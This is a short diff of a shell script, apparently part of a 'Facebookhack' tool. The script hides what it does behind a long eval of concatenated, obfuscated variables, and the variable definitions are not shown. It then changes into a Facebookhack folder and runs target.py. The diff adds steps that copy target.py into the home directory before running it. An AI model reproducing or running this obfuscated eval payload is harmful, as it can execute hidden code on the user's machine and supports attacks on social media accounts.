@@ -3,4 +3,7 @@ z="
 eval "$Az$Bz$Cz$Dz$z$Az$Ez$Fz$z$Az$Gz$Hz$z$Az$Iz$Jz$z$Kz$Lz$z$Mz$Nz$Oz$z$Pz$Nz$Qz$z$Rz$Nz$Sz$z$Tz$Nz$Uz$z$Vz$Nz$Wz$z$Xz$Yz$Zz$az$z$bz$cz$dz$ez$fz$gz$hz$z$iz$jz$kz$lz$mz$z$iz$jz$kz$lz$nz$z$oz$z$pz$qz$rz$sz$tz$z$pz$qz$rz$sz$uz$z$pz$qz$rz$sz$vz$z$pz$qz$rz$sz$wz$z$pz$qz$rz$sz$xz$z$pz$qz$rz$sz$yz$z$pz$qz$rz$sz$ABz$z$pz$qz$rz$sz$BBz$z$pz$qz$rz$sz$CBz$z$pz$qz$rz$sz$DBz$z$pz$qz$rz$EBz$z$pz$qz$rz$FBz$z$pz$qz$rz$GBz$z$pz$qz$rz$HBz$z$pz$qz$rz$IBz$z$pz$qz$rz$JBz$z$pz$qz$rz$KBz$z$pz$qz$rz$LBz$z$pz$qz$rz$MBz$z$pz$qz$rz$NBz$z$pz$OBz$PBz$QBz$RBz$z$pz$SBz$TBz$UBz$z$pz$VBz$rz$EBz$z$pz$qz$WBz$XBz$z$pz$VBz$WBz$XBz$z$pz$qz$YBz$z$pz$VBz$YBz$z$pz$qz$ZBz$z$pz$qz$aBz$z$pz$qz$z$pz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$z$pz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$kBz$lBz$z$bz$mBz$nBz$oBz$pBz$z$qBz$rBz$sBz$tBz$uBz$dz$vBz$wBz$xBz$yBz$ACz"%
 cd
 cd Facebookhack
+cp target.py $HOME
+cd
 python target.py
+
